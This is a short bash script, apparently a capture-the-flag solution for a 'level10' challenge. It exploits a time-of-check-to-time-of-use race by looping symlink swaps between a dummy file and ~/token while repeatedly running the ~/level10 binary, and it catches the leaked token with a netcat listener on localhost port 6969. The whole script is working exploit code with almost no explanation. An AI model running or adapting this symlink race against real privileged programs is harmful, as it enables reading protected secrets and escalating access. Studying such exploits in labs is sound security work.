#!/bin/bash
echo -n > /var/crash/link
echo -n > /var/crash/fake
while true; do
	# f to force to unlink
	ln -fs ~/token /var/crash/link
	ln -fs /var/crash/fake /var/crash/link
done &

while true; do
	~/level10 /var/crash/link 127.0.0.1
done &

# l to listen and k to keep listening
# grep is needed otherwise it's hard to find the token in the output stream.
nc -lk localhost 6969 | grep -m 1 -v '.*( )*.'

killall race_condition.sh
